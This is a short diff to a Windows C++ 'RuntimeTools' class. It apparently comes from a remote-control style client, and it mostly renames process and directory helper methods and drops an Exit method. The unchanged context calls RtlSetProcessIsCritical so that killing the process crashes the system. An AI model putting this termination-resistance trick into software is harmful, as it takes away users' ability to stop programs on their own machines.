@@ -32,7 +32,7 @@ class RuntimeTools{
 		char* tmp=NULL;
 
 	public:
-		pid_t Pid(){
+		int ProcessID(){
 			return (pid=GetCurrentProcessId());
 		}
 		void Background(){
@@ -42,7 +42,7 @@ class RuntimeTools{
 			val*=1000;
 			Sleep(val);
 		}
-		char* Pwd(){
+		char* CurrentDirectory(){
 			if (tmp){
 				free(tmp);
 				tmp=NULL;
@@ -51,7 +51,7 @@ class RuntimeTools{
 			GetCurrentDirectoryA(PAMAX, tmp);
 			return  tmp;
 		}
-		void ChangeDir(const char* dir){
+		void ChangeDirectory(const char* dir){
 			SetCurrentDirectory(dir);
 			return ;
 		}
@@ -61,9 +61,6 @@ class RuntimeTools{
 
 			SetCriticalProcess=(RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
 			SetCriticalProcess(TRUE, NULL, FALSE);
-		}
-		void Exit(int x=0){
-			exit(x);
 		}
 
 		void Restart(int rstat=0x00){
